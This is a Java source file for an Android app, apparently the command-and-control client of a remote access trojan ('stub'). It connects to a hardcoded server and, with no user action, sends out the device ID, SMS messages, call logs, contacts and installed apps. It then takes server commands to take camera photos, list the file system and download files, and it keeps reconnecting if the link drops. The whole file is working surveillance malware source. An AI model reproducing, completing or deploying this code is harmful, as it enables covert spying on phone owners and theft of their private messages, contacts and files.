package com.qirat.stub;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;


public class Socket {

    private static final String TAG = "SocketManager";

    private static String SERVER_IP = "192.168.1.64";
    private static int SERVER_PORT = 8080;

    private static volatile Socket instance;
    private java.net.Socket tcpSocket;
    private PrintWriter writer;
    private BufferedReader reader;
    private Thread receiverThread;
    private boolean isConnected = false;
    private Context context;


    public interface OnDataReceivedListener {
        void onDataReceived(String data);
    }

    private OnDataReceivedListener dataListener;

    private Socket(Context context) {
        this.context = context.getApplicationContext();
    }


    public static Socket getInstance(Context context) {
        if (instance == null) {
            synchronized (Socket.class) {
                if (instance == null) {
                    instance = new Socket(context.getApplicationContext());
                }
            }
        }
        return instance;
    }


    public void connect() {
        if (isConnected) {
            Log.w(TAG, "Already connected.");
            return;
        }

        new Thread(() -> {
            try {
                Log.i(TAG, "=== STARTING CONNECTION ATTEMPT ===");
                Log.i(TAG, "Target: " + SERVER_IP + ":" + SERVER_PORT);
                Log.i(TAG, "Android Version: " + android.os.Build.VERSION.SDK_INT);
                
                tcpSocket = new java.net.Socket();
                tcpSocket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT), 10000);
                
                Log.i(TAG, "TCP socket connected successfully!");
                
                writer = new PrintWriter(new BufferedWriter(
                        new OutputStreamWriter(tcpSocket.getOutputStream())), true);
                reader = new BufferedReader(
                        new InputStreamReader(tcpSocket.getInputStream()));

                isConnected = true;
                Log.i(TAG, "Streams initialized. Connection established!");


                sendDeviceInfo();


                sendInitialData();


                startHeartbeat();


                startReceiving();

            } catch (Exception e) {
                Log.e(TAG, "=== CONNECTION FAILED ===");
                Log.e(TAG, "Error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
                e.printStackTrace();
                isConnected = false;

                reconnect();
            }
        }).start();
    }


    private void startHeartbeat() {
        new Thread(() -> {
            try {
                while (isConnected) {
                    sendData("PING");
                    Thread.sleep(5000);
                }
            } catch (InterruptedException e) {
                Log.e(TAG, "Heartbeat interrupted");
            }
        }).start();
    }


    private void sendDeviceInfo() {
        try {
            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(), 
                    Settings.Secure.ANDROID_ID);


            String deviceInfo = "model=" + android.net.Uri.encode(Build.MODEL) +
                    "&manf=" + Build.MANUFACTURER +
                    "&release=" + Build.VERSION.RELEASE +
                    "&id=" + deviceID;

            sendData(deviceInfo);
            Log.d(TAG, "Device info sent: " + deviceInfo);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send device info: " + e.getMessage());
        }
    }


    private void sendInitialData() {
        new Thread(() -> {
            try {

                Thread.sleep(1000);

                Log.d(TAG, "Sending initial data automatically...");


                SMSManager.sendSMSListToServer(context);
                Thread.sleep(500);


                CallsManager.sendCallLogsToServer(context);
                Thread.sleep(500);


                ContactsManager.sendContactsToServer(context);
                Thread.sleep(500);


                ApplicationManager.sendApplicationsListToServer(context);

                Log.d(TAG, "Initial data sent successfully");

            } catch (Exception e) {
                Log.e(TAG, "Error sending initial data: " + e.getMessage());
            }
        }).start();
    }


    private void startReceiving() {
        receiverThread = new Thread(() -> {
            try {
                String line;
                while (isConnected && (line = reader.readLine()) != null) {
                    Log.d(TAG, "Received: " + line);
                    if (dataListener != null) {
                        dataListener.onDataReceived(line);
                    }
                    processCommand(line);
                }
            } catch (Exception e) {
                Log.e(TAG, "Receiver error: " + e.getMessage());
            } finally {
                isConnected = false;
                reconnect();
            }
        });
        receiverThread.start();
    }


    private void processCommand(String command) {
        try {
            if (command == null || command.isEmpty()) return;


            String[] parts = command.split(":", 2);
            String cmd = parts[0].trim();
            String param = parts.length > 1 ? parts[1].trim() : "";

            switch (cmd) {
                case "getSms":
                    SMSManager.sendSMSListToServer(context);
                    break;
                case "getCalls":
                    CallsManager.sendCallLogsToServer(context);
                    break;
                case "getContacts":
                    ContactsManager.sendContactsToServer(context);
                    break;
                case "getApps":
                    ApplicationManager.sendApplicationsListToServer(context);
                    break;
                case "getCams":
                    CameraManager.sendCameraListToServer(context);
                    break;
                case "takePic":
                    if (!param.isEmpty()) {
                        try {
                            String[] camParts = param.split(":");
                            int camId = Integer.parseInt(camParts[0]);
                            int camQuality = camParts.length > 1 ? Integer.parseInt(camParts[1]) : 50;
                            new CameraManager(context).takePhoto(camId, camQuality);
                        } catch (NumberFormatException e) {
                            Log.e(TAG, "Invalid camera params: " + param);
                        }
                    }
                    break;
                case "getFiles":
                    if (!param.isEmpty()) {
                        FileManager.sendWalkResultToServer(context, param);
                    }
                    break;
                case "downloadFile":
                    if (!param.isEmpty()) {
                        FileManager.downloadFile(context, param);
                    }
                    break;
                default:
                    Log.w(TAG, "Unknown command: " + cmd);
            }
        } catch (Exception e) {
            Log.e(TAG, "Command processing error: " + e.getMessage());
        }
    }


    public void sendData(String data) {
        if (!isConnected || writer == null) {
            Log.w(TAG, "Cannot send data, not connected");
            return;
        }

        new Thread(() -> {
            try {
                writer.println(data);
                Log.d(TAG, "Sent: " + data);
            } catch (Exception e) {
                Log.e(TAG, "Send error: " + e.getMessage());
            }
        }).start();
    }


    private void reconnect() {
        new Thread(() -> {
            try {
                Thread.sleep(5000);
                Log.i(TAG, "Attempting to reconnect...");
                connect();
            } catch (InterruptedException e) {
                Log.e(TAG, "Reconnect interrupted");
            }
        }).start();
    }


    public void disconnect() {
        isConnected = false;
        try {
            if (writer != null) writer.close();
            if (reader != null) reader.close();
            if (tcpSocket != null) tcpSocket.close();
            Log.i(TAG, "Disconnected from server");
        } catch (Exception e) {
            Log.e(TAG, "Disconnect error: " + e.getMessage());
        }
    }


    public boolean isConnected() {
        return isConnected && tcpSocket != null && tcpSocket.isConnected();
    }


    public void setDataListener(OnDataReceivedListener listener) {
        this.dataListener = listener;
    }


    public java.net.Socket getTcpSocket() {
        return tcpSocket;
    }
}
